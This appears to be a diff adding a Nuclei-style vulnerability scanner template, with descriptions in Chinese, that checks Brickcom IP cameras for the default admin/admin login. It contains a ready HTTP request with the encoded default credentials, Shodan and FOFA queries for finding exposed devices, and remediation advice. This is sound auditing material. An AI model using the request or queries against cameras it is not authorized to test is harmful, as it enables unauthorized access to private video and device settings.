@@ -1,0 +1,41 @@
+id: brickcom-camera-default-login
+
+info:
+  name: Brickcom Camera 默认口令登录漏洞
+  author: 0x_Akoko
+  severity: high
+  description: |
+    检测到使用默认凭据（admin/admin）即可成功登录的 Brickcom IP 摄像机。远程攻击者通过该默认口令完成身份验证后，可获取完整的摄像机配置信息、实时视频流，并具备 LED 控制及网络设置修改权限，造成敏感信息泄露与设备被非法控制的风险。
+  reference:
+    - https://www.brickcom.com/support/faq_contents.php?id=48
+    - https://cxsecurity.com/issue/WLB-2026020031
+  metadata:
+    verified: true
+    max-request: 1
+    shodan-query: 'realm="Brickcom"'
+    fofa-query: 'title="Brickcom"'
+  tags: Brickcom-Camera
+  remediation: >-
+    升级到已修复版本，并在服务端对每个受影响的操作和资源执行身份认证与授权检查。采用默认拒绝的访问控制策略，删除默认凭据，在可用时启用多因素认证，并限制管理端点的访问。
+
+http:
+  - raw:
+      - |
+        GET /index_mjpg.html HTTP/1.1
+        Host: {{Hostname}}
+        Authorization: Basic YWRtaW46YWRtaW4=
+        Connection: close
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        condition: and
+        words:
+          - "var viewer='admin'"
+          - "Brickcom Corporation"
+          - "wledctl.cgi"
+
+# digest: 4a0a00473045022100f3737dc67d550f80eb388c9f49c7bb56ec6f4cc354d6a006385ded0abd8fc39d0220016595065264a6e7a8ad08568a2fc8ac30fdb0edbe3c5e94df486100fb380ce8:922c64590222798bb761d5b6d8e72950
